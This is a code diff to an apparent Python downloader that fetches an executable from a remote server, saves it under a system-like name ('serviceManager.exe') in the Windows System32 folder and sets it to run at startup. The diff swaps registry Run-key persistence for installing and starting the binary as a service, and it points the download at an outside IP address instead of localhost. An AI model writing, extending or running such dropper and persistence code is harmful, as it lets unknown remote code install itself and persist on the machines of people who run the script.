@@ -1,7 +1,7 @@
 # download file from server and add it to autostart
-import winreg as reg
 import os
 import requests
+import subprocess
 
 class StartScript: 
     _path_file = "" # path to download file
@@ -17,9 +17,14 @@ class StartScript:
         self.download_file("autostart")
 
         try:
-            registry_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
-            reg.SetValueEx(registry_key, self._key_name, 0, reg.REG_SZ, self._path_file)            
-            reg.CloseKey(registry_key)
+            subprocess.run(
+                [r'C:\Windows\System32\ServiceManager.exe', 'install'],
+                check=True                               
+            )
+            subprocess.run(
+                [r'C:\Windows\System32\ServiceManager.exe', 'start'],
+                check=True
+            )
         except Exception as ex:
             print(f"err: {ex}")
             return 1
@@ -50,7 +55,7 @@ class StartScript:
             print(e)
             return False
 
-program = StartScript(r"C:\Windows\System32\serviceManager.exe", "serviceManager", "http://127.0.0.1:8000/")
+program = StartScript(r"C:\Windows\System32\serviceManager.exe", "serviceManager", "http://144.31.73.100:4545/")
 program.install()
 
 # test compiled version
